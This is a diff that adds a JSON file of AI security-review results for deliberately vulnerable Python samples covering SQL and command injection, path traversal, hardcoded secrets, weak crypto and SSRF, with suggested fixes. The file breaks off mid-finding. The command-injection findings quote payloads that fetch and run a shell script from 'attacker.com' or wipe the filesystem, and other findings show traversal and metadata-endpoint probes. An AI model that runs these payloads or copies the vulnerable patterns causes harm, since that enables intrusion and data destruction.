@@ -1,0 +1,524 @@
+[
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/01_sql_injection.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-89",
+        "owasp_category": "A03:2021 - Injection",
+        "title": "SQL Injection via f-string in get_user()",
+        "file_path": "examples/vulnerable_samples/python/01_sql_injection.py",
+        "line_start": 32,
+        "line_end": 33,
+        "description": "The `user_id` parameter is taken directly from the URL route and interpolated into the SQL query using an f-string without any sanitization or parameterization. An attacker can craft a malicious URL such as `/user/1 OR 1=1--` to manipulate the query logic, extract arbitrary data, or cause other unintended SQL behavior.",
+        "vulnerable_code": "query = f\"SELECT id, name, email FROM users WHERE id = {user_id}\"\ncursor.execute(query)",
+        "suggested_fix": "Use a parameterized query to safely pass user input to the database driver:\n\n```python\nquery = \"SELECT id, name, email FROM users WHERE id = ?\"\ncursor.execute(query, (user_id,))\n```",
+        "confidence": "high",
+        "reasoning": "`user_id` comes directly from the Flask URL route (attacker-controlled) and is interpolated into the SQL string via an f-string, allowing arbitrary SQL to be injected without any sanitization or parameterization."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-89",
+        "owasp_category": "A03:2021 - Injection",
+        "title": "SQL Injection via string concatenation in search_users()",
+        "file_path": "examples/vulnerable_samples/python/01_sql_injection.py",
+        "line_start": 41,
+        "line_end": 44,
+        "description": "The `name` query parameter is taken directly from the HTTP request and concatenated into the SQL query string without sanitization or parameterization. An attacker can supply a value such as `%' OR '1'='1` to break out of the LIKE clause and manipulate the query, potentially dumping the entire users table or performing other SQL operations.",
+        "vulnerable_code": "name = request.args.get(\"name\", \"\")\n...\ncursor.execute(\"SELECT id, name FROM users WHERE name LIKE '%\" + name + \"%'\")",
+        "suggested_fix": "Use a parameterized query with the LIKE wildcard characters included in the parameter value:\n\n```python\nname = request.args.get(\"name\", \"\")\ncursor.execute(\"SELECT id, name FROM users WHERE name LIKE ?\", (f\"%{name}%\",))\n```",
+        "confidence": "high",
+        "reasoning": "`name` is sourced from `request.args` (attacker-controlled) and directly concatenated into the SQL string, allowing an attacker to inject arbitrary SQL by including quote characters and SQL keywords in the query parameter."
+      }
+    ],
+    "summary": "This PR introduces a new deliberately vulnerable sample file containing two SQL injection vulnerabilities (CWE-89), both of high severity and high confidence. The first is in `get_user()` (line 32) where a URL route parameter is interpolated into a SQL query via an f-string. The second is in `search_users()` (line 44) where a query string parameter is concatenated directly into a SQL LIKE clause. Both are unauthenticated endpoints, making them directly exploitable by any attacker. The file is labeled as intentionally vulnerable for a test corpus, but the findings are reported as required. Remediation in both cases is straightforward: use parameterized queries.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5454,
+    "output_tokens": 948,
+    "elapsed_seconds": 14.74539380002534
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/02_command_injection.py"
+    ],
+    "findings": [
+      {
+        "severity": "critical",
+        "cwe_id": "CWE-78",
+        "owasp_category": "A03:2021 - Injection",
+        "title": "OS Command Injection via os.system with unsanitized user input",
+        "file_path": "examples/vulnerable_samples/python/02_command_injection.py",
+        "line_start": 23,
+        "line_end": 25,
+        "description": "The `host` parameter is taken directly from the HTTP query string and interpolated into a shell command passed to `os.system()`. An attacker can submit a request like `?host=1.1.1.1;rm+-rf+/` or `?host=1.1.1.1;curl+attacker.com/shell.sh|bash` to execute arbitrary OS commands with the privileges of the web server process. This endpoint is unauthenticated, making it a critical unauthenticated RCE.",
+        "vulnerable_code": "host = request.args.get(\"host\", \"127.0.0.1\")\nos.system(f\"ping -c 1 {host}\")",
+        "suggested_fix": "Use subprocess with a list argument and shell=False to avoid shell interpretation entirely. Validate the host against an allowlist or use a library that handles the network operation directly:\n\n```python\nimport re\nimport subprocess\n\n@app.route(\"/ping\")\ndef ping_host():\n    host = request.args.get(\"host\", \"127.0.0.1\")\n    # Validate: only allow valid hostnames/IPs\n    if not re.fullmatch(r'[a-zA-Z0-9._-]{1,253}', host):\n        return \"Invalid host\", 400\n    result = subprocess.run(\n        [\"ping\", \"-c\", \"1\", host],\n        shell=False,\n        capture_output=True,\n        timeout=5,\n    )\n    return f\"Pinged {host}\"\n```",
+        "confidence": "high",
+        "reasoning": "`request.args.get('host')` is attacker-controlled and is interpolated directly into the string passed to `os.system()`, which invokes a shell. Shell metacharacters (`;`, `|`, `$()`, etc.) are not sanitized, allowing arbitrary command execution. The endpoint requires no authentication, making this a critical unauthenticated RCE."
+      },
+      {
+        "severity": "critical",
+        "cwe_id": "CWE-78",
+        "owasp_category": "A03:2021 - Injection",
+        "title": "OS Command Injection via subprocess with shell=True and unsanitized user input",
+        "file_path": "examples/vulnerable_samples/python/02_command_injection.py",
+        "line_start": 32,
+        "line_end": 37,
+        "description": "The `filename` parameter is taken directly from the HTTP query string and interpolated into a shell command string passed to `subprocess.check_output()` with `shell=True`. An attacker can submit `?file=foo;curl+attacker.com/shell.sh|bash` or use path traversal combined with shell metacharacters to execute arbitrary commands. This endpoint is unauthenticated, making it a critical unauthenticated RCE.",
+        "vulnerable_code": "filename = request.args.get(\"file\", \"\")\nresult = subprocess.check_output(\n    f\"tar -czf /backups/{filename}.tar.gz /data/{filename}\",\n    shell=True,\n)",
+        "suggested_fix": "Use subprocess with a list argument and shell=False. Additionally validate the filename to prevent path traversal:\n\n```python\nimport os\nimport re\nimport subprocess\n\n@app.route(\"/backup\")\ndef backup_file():\n    filename = request.args.get(\"file\", \"\")\n    # Allowlist: only alphanumeric, hyphens, underscores, dots\n    if not re.fullmatch(r'[a-zA-Z0-9._-]{1,64}', filename):\n        return \"Invalid filename\", 400\n    # Prevent path traversal\n    if os.path.sep in filename or filename.startswith('.'):\n        return \"Invalid filename\", 400\n    result = subprocess.check_output(\n        [\"tar\", \"-czf\", f\"/backups/{filename}.tar.gz\", f\"/data/{filename}\"],\n        shell=False,\n    )\n    return result\n```",
+        "confidence": "high",
+        "reasoning": "`request.args.get('file')` is attacker-controlled and is interpolated into a shell command string executed with `shell=True`. Shell metacharacters are not sanitized, allowing arbitrary command execution. The endpoint requires no authentication, making this a critical unauthenticated RCE."
+      }
+    ],
+    "summary": "This PR introduces a vulnerable sample file demonstrating OS command injection. Two critical CWE-78 vulnerabilities were identified: (1) `os.system()` called with an f-string containing unsanitized user input from `request.args` in the `/ping` endpoint, and (2) `subprocess.check_output()` with `shell=True` and an f-string containing unsanitized user input in the `/backup` endpoint. Both are unauthenticated endpoints, making them critical severity. The `/whoami` endpoint correctly uses a fixed list argument with shell=False and is safe. The file is intentionally a vulnerable sample for educational purposes, but the findings are reported as required.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5365,
+    "output_tokens": 1426,
+    "elapsed_seconds": 19.377201800001785
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/03_path_traversal.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-22",
+        "owasp_category": "A01:2021 - Broken Access Control",
+        "title": "Path Traversal in /download endpoint",
+        "file_path": "examples/vulnerable_samples/python/03_path_traversal.py",
+        "line_start": 24,
+        "line_end": 27,
+        "description": "The `filename` parameter is taken directly from the HTTP query string (`request.args.get('file', '')`) and joined with `UPLOAD_DIR` using `os.path.join`. An attacker can supply a value like `../../../etc/passwd` to escape the intended upload directory and read arbitrary files on the filesystem. `os.path.join` does not prevent traversal \u2014 it simply concatenates path components, and `..` sequences are resolved by the OS at open time.",
+        "vulnerable_code": "filename = request.args.get(\"file\", \"\")\n# Attacker can submit ?file=../../../etc/passwd\npath = os.path.join(UPLOAD_DIR, filename)\nreturn send_file(path)",
+        "suggested_fix": "Resolve the final path and verify it is still rooted inside `UPLOAD_DIR` before serving the file:\n\n```python\nimport os\nfrom flask import abort\n\ndef download_file():\n    filename = request.args.get(\"file\", \"\")\n    # Resolve to an absolute path, eliminating any '..' components\n    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))\n    # Ensure the resolved path is inside the allowed directory\n    if not safe_path.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):\n        abort(400)\n    return send_file(safe_path)\n```",
+        "confidence": "high",
+        "reasoning": "`filename` is attacker-controlled HTTP input that flows directly into `os.path.join` and then into `send_file` without any canonicalization or boundary check, allowing directory traversal to read arbitrary files."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-22",
+        "owasp_category": "A01:2021 - Broken Access Control",
+        "title": "Path Traversal in /logs/<log_name> endpoint",
+        "file_path": "examples/vulnerable_samples/python/03_path_traversal.py",
+        "line_start": 31,
+        "line_end": 36,
+        "description": "The `log_name` URL path segment is taken directly from the Flask route parameter and concatenated with `LOG_DIR` using string concatenation. An attacker can request `/logs/../../etc/shadow` to escape the log directory and read arbitrary files. Flask does not strip `..` from route parameters, and the OS resolves the traversal sequences at `open()` time.",
+        "vulnerable_code": "log_path = LOG_DIR + \"/\" + log_name\nwith open(log_path, \"r\") as f:\n    return f.read()",
+        "suggested_fix": "Canonicalize the path and enforce that it remains within `LOG_DIR`:\n\n```python\nimport os\nfrom flask import abort\n\ndef read_log(log_name):\n    safe_path = os.path.realpath(os.path.join(LOG_DIR, log_name))\n    if not safe_path.startswith(os.path.realpath(LOG_DIR) + os.sep):\n        abort(400)\n    with open(safe_path, \"r\") as f:\n        return f.read()\n```\nAdditionally, consider validating `log_name` against an allowlist of known log file names (e.g., a regex `^[a-zA-Z0-9_\\-]+\\.log$`) as a defense-in-depth measure.",
+        "confidence": "high",
+        "reasoning": "`log_name` is an attacker-controlled URL segment that is concatenated directly into a filesystem path and passed to `open()` without canonicalization or boundary enforcement, enabling traversal outside `LOG_DIR`."
+      }
+    ],
+    "summary": "The PR introduces a deliberately vulnerable sample file demonstrating path traversal (CWE-22). Two high-severity, high-confidence path traversal vulnerabilities were identified: one in the `/download` endpoint (line 24\u201327) where a query parameter is joined unsanitized into a file path, and one in the `/logs/<log_name>` endpoint (line 31\u201336) where a URL path segment is concatenated directly into a filesystem path. Both allow an attacker to escape the intended directory and read arbitrary files. The `/static-info` endpoint is correctly safe (no user input). Remediation requires canonicalizing paths with `os.path.realpath` and asserting the result is still within the intended base directory before opening or serving the file.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5360,
+    "output_tokens": 1258,
+    "elapsed_seconds": 18.45574140001554
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/04_hardcoded_credentials.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-798",
+        "owasp_category": "A07:2021 - Identification and Authentication Failures",
+        "title": "Hardcoded Database Password",
+        "file_path": "examples/vulnerable_samples/python/04_hardcoded_credentials.py",
+        "line_start": 18,
+        "line_end": 18,
+        "description": "The database password is hardcoded as a string literal in source code. Anyone with read access to the repository or the compiled artifact can extract this credential and use it to authenticate to the production database.",
+        "vulnerable_code": "DATABASE_PASSWORD = \"Sup3rS3cret!2024\"",
+        "suggested_fix": "Read the password from an environment variable or a secrets manager at runtime:\n```python\nimport os\nDATABASE_PASSWORD = os.environ[\"DATABASE_PASSWORD\"]\n# or use a secrets manager SDK, e.g. AWS Secrets Manager, HashiCorp Vault\n```",
+        "confidence": "high",
+        "reasoning": "The password is a string literal committed to source code. It will appear in version control history, CI logs, and any artifact that includes this file, making it trivially extractable by any party with repository access."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-798",
+        "owasp_category": "A07:2021 - Identification and Authentication Failures",
+        "title": "Hardcoded API Token",
+        "file_path": "examples/vulnerable_samples/python/04_hardcoded_credentials.py",
+        "line_start": 19,
+        "line_end": 19,
+        "description": "A live API token (prefixed `sk-live-`) is hardcoded in source code. This token grants access to a third-party service and can be extracted by anyone with access to the repository or build artifacts.",
+        "vulnerable_code": "API_TOKEN = \"sk-live-9c8f7b2d3e4a5b6c7d8e9f0a1b2c3d4e\"",
+        "suggested_fix": "Load the token from an environment variable or secrets manager:\n```python\nimport os\nAPI_TOKEN = os.environ[\"API_TOKEN\"]\n```\nAlso rotate the exposed token immediately.",
+        "confidence": "high",
+        "reasoning": "The `sk-live-` prefix indicates this is a production API key. Hardcoding it in source exposes it to anyone who can read the file, enabling unauthorized use of the payment or other third-party service."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-798",
+        "owasp_category": "A07:2021 - Identification and Authentication Failures",
+        "title": "Hardcoded JWT Signing Key",
+        "file_path": "examples/vulnerable_samples/python/04_hardcoded_credentials.py",
+        "line_start": 20,
+        "line_end": 20,
+        "description": "The JWT signing key is hardcoded in source code. An attacker who obtains this key can forge arbitrary JWT tokens, effectively bypassing all authentication and authorization controls that rely on JWT verification.",
+        "vulnerable_code": "JWT_SIGNING_KEY = \"this-is-the-jwt-secret-do-not-share\"",
+        "suggested_fix": "Load the signing key from an environment variable or secrets manager:\n```python\nimport os\nJWT_SIGNING_KEY = os.environ[\"JWT_SIGNING_KEY\"]\n```\nAlso rotate the exposed key immediately and invalidate all existing tokens.",
+        "confidence": "high",
+        "reasoning": "A hardcoded JWT signing key allows any party who reads the source to forge valid tokens for any user or role, completely undermining the authentication system."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-798",
+        "owasp_category": "A07:2021 - Identification and Authentication Failures",
+        "title": "Hardcoded AWS Access Key ID",
+        "file_path": "examples/vulnerable_samples/python/04_hardcoded_credentials.py",
+        "line_start": 21,
+        "line_end": 21,
+        "description": "An AWS Access Key ID is hardcoded in source code. Combined with the also-hardcoded secret key, this gives any reader full programmatic access to the associated AWS account and its resources.",
+        "vulnerable_code": "AWS_ACCESS_KEY = \"AKIAIOSFODNN7EXAMPLE\"",
+        "suggested_fix": "Use IAM instance roles, environment variables, or AWS Secrets Manager instead of hardcoded keys:\n```python\nimport os\nAWS_ACCESS_KEY = os.environ[\"AWS_ACCESS_KEY_ID\"]\n```\nPreferably, use IAM roles attached to the compute resource so no long-lived credentials are needed at all.",
+        "confidence": "high",
+        "reasoning": "AWS Access Key IDs are well-known credential formats (AKIA prefix). Hardcoding them in source exposes them to repository readers and automated secret-scanning tools used by attackers."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-798",
+        "owasp_category": "A07:2021 - Identification and Authentication Failures",
+        "title": "Hardcoded AWS Secret Access Key",
+        "file_path": "examples/vulnerable_samples/python/04_hardcoded_credentials.py",
+        "line_start": 22,
+        "line_end": 22,
+        "description": "An AWS Secret Access Key is hardcoded in source code. Together with the hardcoded Access Key ID, this constitutes a complete set of AWS credentials that grants programmatic access to AWS services.",
+        "vulnerable_code": "AWS_SECRET_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"",
+        "suggested_fix": "Use IAM instance roles or load from environment variables:\n```python\nimport os\nAWS_SECRET_KEY = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n```\nRotate the exposed key immediately via the AWS IAM console.",
+        "confidence": "high",
+        "reasoning": "The AWS Secret Access Key is the second half of a complete AWS credential pair. Its presence in source code alongside the Access Key ID enables full AWS API access for any reader of the file."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-798",
+        "owasp_category": "A07:2021 - Identification and Authentication Failures",
+        "title": "Credentials Embedded in URL (Basic Auth)",
+        "file_path": "examples/vulnerable_samples/python/04_hardcoded_credentials.py",
+        "line_start": 46,
+        "line_end": 46,
+        "description": "The username `admin` and password `hunter2` are embedded directly in the URL string passed to `requests.get`. Credentials in URLs are logged by web servers, proxies, and HTTP client libraries, and are visible in browser history and referrer headers.",
+        "vulnerable_code": "return requests.get(\"https://admin:hunter2@internal.example.com/api/status\")",
+        "suggested_fix": "Use the `auth` parameter of the requests library instead, and load credentials from environment variables:\n```python\nimport os\nusername = os.environ[\"INTERNAL_API_USER\"]\npassword = os.environ[\"INTERNAL_API_PASSWORD\"]\nreturn requests.get(\n    \"https://internal.example.com/api/status\",\n    auth=(username, password),\n)\n```",
+        "confidence": "high",
+        "reasoning": "Credentials embedded in URLs are exposed in access logs, proxy logs, and HTTP Referer headers. Additionally, hardcoding them in source code makes them visible to anyone with repository access."
+      }
+    ],
+    "summary": "6 high-severity findings identified in this PR. All findings are CWE-798 (Hardcoded Credentials). The file contains five module-level hardcoded secrets (database password, API token, JWT signing key, AWS access key ID, and AWS secret access key) and one instance of credentials embedded directly in a URL. The safe counter-example at lines 49\u201356 (reading from `os.environ`) is correctly implemented and was not flagged. All hardcoded secrets should be rotated immediately and replaced with environment variable or secrets-manager lookups.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5552,
+    "output_tokens": 2158,
+    "elapsed_seconds": 29.808028500003275
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/05_weak_crypto.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-916",
+        "owasp_category": "A02:2021 - Cryptographic Failures",
+        "title": "MD5 Used for Password Hashing",
+        "file_path": "examples/vulnerable_samples/python/05_weak_crypto.py",
+        "line_start": 19,
+        "line_end": 22,
+        "description": "The `hash_password` function uses MD5 to hash passwords. MD5 is a general-purpose, fast hash function \u2014 not a password-specific key derivation function. It is unsalted here, making it trivially vulnerable to rainbow table attacks, and its speed enables billions of brute-force attempts per second on commodity hardware.",
+        "vulnerable_code": "return hashlib.md5(password.encode()).hexdigest()",
+        "suggested_fix": "Use a password-specific KDF such as bcrypt, argon2, or scrypt:\n\n```python\nimport bcrypt\n\ndef hash_password(password: str) -> bytes:\n    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n```\n\nOr with argon2:\n```python\nfrom argon2 import PasswordHasher\nph = PasswordHasher()\ndef hash_password(password: str) -> str:\n    return ph.hash(password)\n```",
+        "confidence": "high",
+        "reasoning": "MD5 is a fast, general-purpose hash with no salting applied here. Passwords hashed with MD5 can be cracked via rainbow tables or GPU-accelerated brute force in seconds to minutes. CWE-916 applies because the root cause is using a non-password KDF for password storage."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-916",
+        "owasp_category": "A02:2021 - Cryptographic Failures",
+        "title": "SHA-1 Used for Password Hashing",
+        "file_path": "examples/vulnerable_samples/python/05_weak_crypto.py",
+        "line_start": 25,
+        "line_end": 27,
+        "description": "The `hash_password_sha1` function uses SHA-1 to hash passwords. Like MD5, SHA-1 is a fast, general-purpose hash function not designed for password storage. It is unsalted, making it vulnerable to rainbow table attacks, and its speed allows high-throughput offline brute-force attacks.",
+        "vulnerable_code": "return hashlib.sha1(password.encode()).hexdigest()",
+        "suggested_fix": "Replace with a password-specific KDF such as bcrypt, argon2, or scrypt. See the fix for `hash_password` above.",
+        "confidence": "high",
+        "reasoning": "SHA-1 is a fast digest algorithm with no salting applied. Using it for password storage allows offline brute-force and rainbow table attacks. CWE-916 applies because the root cause is using a non-password KDF for password storage."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-327",
+        "owasp_category": "A02:2021 - Cryptographic Failures",
+        "title": "AES in ECB Mode Used for Encryption",
+        "file_path": "examples/vulnerable_samples/python/05_weak_crypto.py",
+        "line_start": 30,
+        "line_end": 34,
+        "description": "The `encrypt_sensitive_data` function uses AES in ECB (Electronic Codebook) mode. ECB mode encrypts each block independently with no diffusion between blocks. Identical plaintext blocks produce identical ciphertext blocks, leaking structural patterns in the data (e.g., the classic 'ECB penguin' image attack). This makes it unsuitable for encrypting any non-trivial data.",
+        "vulnerable_code": "cipher = AES.new(key, AES.MODE_ECB)\nreturn cipher.encrypt(pad(plaintext, AES.block_size))",
+        "suggested_fix": "Use AES in a secure mode such as GCM (which also provides authentication) or CBC with a random IV:\n\n```python\nimport os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\ndef encrypt_sensitive_data(plaintext: bytes, key: bytes) -> bytes:\n    iv = os.urandom(16)\n    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)\n    ciphertext, tag = cipher.encrypt_and_digest(plaintext)\n    return iv + tag + ciphertext  # prepend nonce and auth tag\n```",
+        "confidence": "high",
+        "reasoning": "ECB mode is a fundamentally broken cipher mode because it is deterministic and stateless \u2014 identical plaintext blocks always produce identical ciphertext blocks, revealing data patterns to an attacker. This is a risky algorithm choice (CWE-327), not a key-length or IV issue."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-326",
+        "owasp_category": "A02:2021 - Cryptographic Failures",
+        "title": "DES Used for Encryption (Inadequate Key Length)",
+        "file_path": "examples/vulnerable_samples/python/05_weak_crypto.py",
+        "line_start": 37,
+        "line_end": 40,
+        "description": "The `encrypt_with_des` function uses DES, which has an effective key length of only 56 bits. A 56-bit key space can be exhaustively searched in hours using modern hardware (e.g., FPGA clusters or cloud compute). DES has been considered cryptographically broken since the late 1990s and was formally deprecated by NIST.",
+        "vulnerable_code": "cipher = DES.new(key, DES.MODE_CBC, iv=b\"12345678\")\nreturn cipher.encrypt(pad(plaintext, DES.block_size))",
+        "suggested_fix": "Replace DES with AES-256 (or at minimum AES-128) in a secure mode such as GCM:\n\n```python\nimport os\nfrom Crypto.Cipher import AES\n\ndef encrypt_with_aes(plaintext: bytes, key: bytes) -> bytes:\n    # key must be 16, 24, or 32 bytes for AES-128/192/256\n    nonce = os.urandom(16)\n    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n    ciphertext, tag = cipher.encrypt_and_digest(plaintext)\n    return nonce + tag + ciphertext\n```",
+        "confidence": "high",
+        "reasoning": "DES uses a 56-bit key, which is far below the 128-bit minimum considered secure today. The inadequate key length (CWE-326) is the primary reason DES is broken \u2014 it enables practical brute-force attacks. Additionally, the IV `b\"12345678\"` is hardcoded (CWE-329), compounding the weakness."
+      },
+      {
+        "severity": "medium",
+        "cwe_id": "CWE-329",
+        "owasp_category": "A02:2021 - Cryptographic Failures",
+        "title": "Hardcoded Static IV Used in DES-CBC Encryption",
+        "file_path": "examples/vulnerable_samples/python/05_weak_crypto.py",
+        "line_start": 39,
+        "line_end": 39,
+        "description": "The `encrypt_with_des` function passes a hardcoded, static IV (`b\"12345678\"`) to DES in CBC mode. Reusing the same IV with the same key across multiple encryptions allows an attacker to detect when the same plaintext prefix is encrypted, and in some scenarios enables chosen-plaintext attacks to recover plaintext.",
+        "vulnerable_code": "cipher = DES.new(key, DES.MODE_CBC, iv=b\"12345678\")",
+        "suggested_fix": "Generate a fresh random IV for each encryption operation and prepend it to the ciphertext:\n\n```python\nimport os\niv = os.urandom(8)  # DES block size is 8 bytes\ncipher = DES.new(key, DES.MODE_CBC, iv=iv)\nciphertext = iv + cipher.encrypt(pad(plaintext, DES.block_size))\n```\n\nNote: Even with a random IV, DES should be replaced with AES due to its inadequate key length.",
+        "confidence": "high",
+        "reasoning": "A hardcoded IV means every call to this function with the same key produces ciphertext with the same IV, breaking IND-CPA security for CBC mode. An attacker who can observe multiple ciphertexts can detect repeated plaintext prefixes."
+      },
+      {
+        "severity": "medium",
+        "cwe_id": "CWE-329",
+        "owasp_category": "A02:2021 - Cryptographic Failures",
+        "title": "Hardcoded Fixed IV Used in AES-CBC Encryption",
+        "file_path": "examples/vulnerable_samples/python/05_weak_crypto.py",
+        "line_start": 44,
+        "line_end": 49,
+        "description": "The `encrypt_with_fixed_iv` function uses a module-level constant `FIXED_IV = b\"\\x00\" * 16` as the IV for AES-CBC. Reusing the same IV with the same key for every encryption call means that two messages with the same plaintext prefix will produce identical ciphertext prefixes, breaking semantic security (IND-CPA). This can leak information about plaintext structure.",
+        "vulnerable_code": "FIXED_IV = b\"\\x00\" * 16\n\ndef encrypt_with_fixed_iv(plaintext: bytes, key: bytes) -> bytes:\n    cipher = AES.new(key, AES.MODE_CBC, iv=FIXED_IV)\n    return cipher.encrypt(pad(plaintext, AES.block_size))",
+        "suggested_fix": "Generate a cryptographically random IV per encryption call and prepend it to the ciphertext:\n\n```python\nimport os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\ndef encrypt_with_random_iv(plaintext: bytes, key: bytes) -> bytes:\n    iv = os.urandom(16)\n    cipher = AES.new(key, AES.MODE_CBC, iv=iv)\n    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\n    return iv + ciphertext  # prepend IV so decryptor can recover it\n```\n\nConsider switching to AES-GCM for authenticated encryption.",
+        "confidence": "high",
+        "reasoning": "A constant all-zero IV reused across all encryptions with the same key causes identical plaintext blocks to produce identical ciphertext blocks at the start of each message, breaking IND-CPA security. This is CWE-329 (fixed/predictable IV), not CWE-327, because AES-CBC itself is acceptable when used correctly."
+      }
+    ],
+    "summary": "This PR introduces a deliberately vulnerable cryptographic sample file with 6 distinct security findings across 5 functions. The highest severity issues are: (1) MD5 and SHA-1 used for password hashing (CWE-916, high), (2) AES in ECB mode (CWE-327, high), and (3) DES encryption with a 56-bit key (CWE-326, high). Two additional medium-severity findings cover hardcoded/static IVs in DES-CBC and AES-CBC (CWE-329). All findings are high confidence because the vulnerable patterns are explicit and unambiguous. This file is labeled as an intentional vulnerable sample for educational purposes, but the findings are reported as real vulnerabilities per review instructions.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5560,
+    "output_tokens": 3028,
+    "elapsed_seconds": 44.06066869996721
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/06_ssrf.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-918",
+        "owasp_category": "A10:2021 - Server-Side Request Forgery (SSRF)",
+        "title": "SSRF via user-controlled URL in /fetch endpoint",
+        "file_path": "examples/vulnerable_samples/python/06_ssrf.py",
+        "line_start": 23,
+        "line_end": 27,
+        "description": "The `url` parameter is taken directly from the HTTP query string and passed to `requests.get()` without any validation, allowlisting, or scheme restriction. An attacker can supply arbitrary URLs such as `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1 metadata), `http://localhost:6379` (Redis), or `http://10.0.0.1/admin` to reach internal services that are not exposed to the internet.",
+        "vulnerable_code": "url = request.args.get(\"url\", \"\")\n    # Attacker can request http://169.254.169.254/latest/meta-data/ on AWS\n    # to exfiltrate cloud metadata, or http://localhost:6379 to talk to Redis.\n    response = requests.get(url, timeout=5)\n    return response.text",
+        "suggested_fix": "Validate the URL against an allowlist of permitted hosts and schemes before making the request:\n\n```python\nALLOWED_HOSTS = {\"api.partner1.com\", \"api.partner2.com\"}\n\n@app.route(\"/fetch\")\ndef fetch_url():\n    url = request.args.get(\"url\", \"\")\n    parsed = urlparse(url)\n    if parsed.scheme not in (\"http\", \"https\"):\n        return \"Invalid scheme\", 400\n    if parsed.hostname not in ALLOWED_HOSTS:\n        return \"Host not allowed\", 403\n    response = requests.get(url, timeout=5)\n    return response.text\n```\nAlso consider blocking private/link-local IP ranges even when using an allowlist, and prefer IMDSv2 token-based access on AWS to mitigate metadata endpoint abuse.",
+        "confidence": "high",
+        "reasoning": "The attacker-controlled `url` query parameter flows directly into `requests.get()` with no validation whatsoever, enabling classic SSRF to reach internal services, cloud metadata endpoints, or other network-adjacent resources."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-918",
+        "owasp_category": "A10:2021 - Server-Side Request Forgery (SSRF)",
+        "title": "SSRF via user-controlled target URL in /webhook-proxy endpoint",
+        "file_path": "examples/vulnerable_samples/python/06_ssrf.py",
+        "line_start": 33,
+        "line_end": 36,
+        "description": "The `target_url` field from the JSON request body is passed directly to `requests.post()` without any validation. An attacker can POST a crafted JSON body with an arbitrary `target_url` (e.g., `http://169.254.169.254/latest/meta-data/`, `http://internal-admin-service/`, or `file:///etc/passwd`) to make the server issue requests to internal or sensitive endpoints, potentially exfiltrating data or triggering unintended side effects on internal services.",
+        "vulnerable_code": "target = request.json.get(\"target_url\")\n    payload = request.json.get(\"payload\")\n    # No validation of target - attacker can hit internal services\n    requests.post(target, json=payload, timeout=10)",
+        "suggested_fix": "Validate `target_url` against an allowlist of permitted hosts and enforce scheme restrictions before forwarding the request:\n\n```python\nALLOWED_WEBHOOK_HOSTS = {\"hooks.partner1.com\", \"hooks.partner2.com\"}\n\n@app.route(\"/webhook-proxy\", methods=[\"POST\"])\ndef webhook_proxy():\n    data = request.json\n    target = data.get(\"target_url\", \"\")\n    payload = data.get(\"payload\")\n    parsed = urlparse(target)\n    if parsed.scheme not in (\"http\", \"https\"):\n        return {\"error\": \"Invalid scheme\"}, 400\n    if parsed.hostname not in ALLOWED_WEBHOOK_HOSTS:\n        return {\"error\": \"Host not allowed\"}, 403\n    requests.post(target, json=payload, timeout=10)\n    return {\"status\": \"sent\"}\n```",
+        "confidence": "high",
+        "reasoning": "The `target_url` value from the attacker-controlled JSON body is passed directly to `requests.post()` with no scheme or host validation, allowing the server to be used as a proxy to reach arbitrary internal or external endpoints."
+      }
+    ],
+    "summary": "This PR introduces a deliberately vulnerable SSRF sample file with two high-severity SSRF vulnerabilities (CWE-918) and one correctly implemented safe example. Both vulnerable endpoints (/fetch and /webhook-proxy) pass attacker-controlled URLs directly to the `requests` library without any validation, enabling classic SSRF attacks against internal services, cloud metadata endpoints, and other network-adjacent resources. The safe example (/safe-fetch) correctly demonstrates allowlist-based mitigation. Since this is an intentional vulnerable sample for educational purposes, the findings are expected per the file's own docstring, but they are real vulnerabilities that must never appear in production code.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5507,
+    "output_tokens": 1427,
+    "elapsed_seconds": 23.54538699996192
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/07_insecure_deserialization.py"
+    ],
+    "findings": [
+      {
+        "severity": "critical",
+        "cwe_id": "CWE-502",
+        "owasp_category": "A08:2021 - Software and Data Integrity Failures",
+        "title": "Insecure Deserialization via pickle.loads on Attacker-Controlled Input",
